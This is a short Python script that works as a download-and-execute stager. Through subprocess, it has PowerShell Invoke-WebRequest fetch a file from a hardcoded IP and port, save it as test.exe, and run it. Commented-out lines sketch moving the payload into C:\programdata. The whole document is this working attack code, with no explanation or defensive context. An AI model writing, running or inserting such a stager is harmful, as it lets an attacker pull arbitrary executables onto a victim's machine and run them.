import requests
import subprocess
import sys

def download_exec(file, ip, port):
    url = f'http://{ip}:{port}/{file}'
    # requests.get(url)

    get_file = f'powershell -c Invoke-WebRequest -Uri "{url}" -OutFile "test.exe"'
    

    # move_command = f"move {file} C:\\programdata"
    # exec_file = f"powershell -c .\\{file}"
    exec_command = f".\\{file}"
    # subprocess.run(move_command, shell = True, capture_output=True, text = True )
    subprocess.run(get_file, shell = True)
    subprocess.run(exec_command, shell= True, capture_output = True, text= True)


download_exec("test.exe", "172.29.138.13", "8080")